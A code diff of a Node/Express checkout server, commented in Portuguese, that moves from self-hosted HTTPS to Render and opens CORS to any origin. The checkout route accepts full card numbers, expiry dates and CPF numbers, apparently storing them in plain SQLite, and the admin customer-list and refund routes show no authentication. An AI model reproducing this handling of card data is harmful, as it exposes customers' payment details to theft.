@@ -1,20 +1,18 @@
 const express = require('express');
-const https = require('https');
-const http = require('http');
-const fs = require('fs');
 const sqlite3 = require('sqlite3').verbose();
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const path = require('path');
 
 const app = express();
-const PORT_HTTPS = 443;
-const PORT_HTTP = 80;
+// No Render, a porta é definida pela variável de ambiente PORT (geralmente 10000)
+const PORT = process.env.PORT || 3000;
 
-app.use(cors());
+// Configurar CORS para aceitar requisições de qualquer lugar (necessário já que o frontend está no GitHub Pages)
+app.use(cors({ origin: '*' }));
 app.use(bodyParser.json());
 
-// Serve frontend static files
+// Serve frontend static files (se acessado diretamente no Render)
 app.use(express.static(path.join(__dirname, '../recuperacao')));
 
 // Initialize Database
@@ -42,7 +40,7 @@ const db = new sqlite3.Database('./database.sqlite', (err) => {
     }
 });
 
-// API: Checkout
+// API: Checkout (Recebe dados da página de vendas)
 app.post('/api/checkout', (req, res) => {
     const { name, cpf, email, method, status, card_number, card_expiry, phone } = req.body;
     
@@ -63,48 +61,17 @@ app.get('/api/admin/customers', (req, res) => {
     });
 });
 
-// API: Admin Refund
+// API: Admin Refund Customer
 app.post('/api/admin/refund', (req, res) => {
     const { id } = req.body;
-    db.get(`SELECT * FROM customers WHERE id = ?`, [id], (err, row) => {
+    db.run(`UPDATE customers SET payment_status = 'refunded' WHERE id = ?`, [id], function(err) {
         if (err) return res.status(500).json({ error: err.message });
-        if (!row) return res.status(404).json({ error: 'Customer not found' });
-        
-        db.run(`UPDATE customers SET payment_status = 'refunded' WHERE id = ?`, [id], (updateErr) => {
-            if (updateErr) return res.status(500).json({ error: updateErr.message });
-            res.json({ success: true, message: 'Refund processed' });
-        });
+        if (this.changes === 0) return res.status(404).json({ success: false, error: 'Customer not found' });
+        res.json({ success: true });
     });
 });
 
-// --- HTTPS Setup ---
-const sslDir = path.join(__dirname, 'ssl');
-const keyPath = path.join(sslDir, 'key.pem');
-const certPath = path.join(sslDir, 'cert.pem');
-
-if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
-    const sslOptions = {
-        key: fs.readFileSync(keyPath),
-        cert: fs.readFileSync(certPath),
-    };
-
-    // HTTPS server (main)
-    https.createServer(sslOptions, app).listen(PORT_HTTPS, () => {
-        console.log(`✅ HTTPS Server running on https://localhost:${PORT_HTTPS}`);
-    });
-
-    // HTTP redirect to HTTPS
-    const redirectApp = express();
-    redirectApp.all('/{*splat}', (req, res) => {
-        res.redirect(`https://${req.hostname}${req.url}`);
-    });
-    http.createServer(redirectApp).listen(PORT_HTTP, () => {
-        console.log(`🔀 HTTP redirect running on http://localhost:${PORT_HTTP} -> HTTPS`);
-    });
-} else {
-    console.log('⚠️  SSL certificates not found. Run "node generate-ssl.js" first.');
-    console.log('   Starting in HTTP mode on port 3000...');
-    app.listen(3000, () => {
-        console.log(`Server running on http://localhost:3000`);
-    });
-}
+// Start Server (Render lida com o HTTPS, nós só precisamos rodar HTTP normal)
+app.listen(PORT, () => {
+    console.log(`✅ Server running on port ${PORT}`);
+});
